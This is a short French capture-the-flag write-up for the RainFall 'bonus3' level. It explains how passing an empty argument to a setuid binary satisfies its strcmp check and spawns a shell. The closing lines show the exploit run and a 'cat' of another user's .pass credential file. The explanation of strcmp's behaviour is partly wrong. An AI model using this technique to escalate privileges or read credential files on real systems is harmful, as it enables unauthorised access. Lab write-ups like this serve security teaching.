On arrive sur un executable qui attends un argument et print une string vide.

En regardant l'assembleur de plus pres ou voit qu'on ouvre le fichier qui contient le mot de passe, on remplit un buffer de 65 characteres,
puis:

buffer[atoi(argv[1])] = 0

Puis on compare le buffer avec argv[1].

int isSame = strcmp(buffer1, argv[1]);
if (isSame == 0) 
    execl("/bin/sh", 0x8048707, 0);

Donc si on mets le bon mot de passe, le programme devrait lancer un shell.

Mais en fait strcmp compare seulement autant de bytes que argv[1] ! Cela aurait pu etre protege en utilisant strncmp plutot, mais ici si on mets un argument vide la condition sera remplie! 

bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
cat /home/user/end/.pass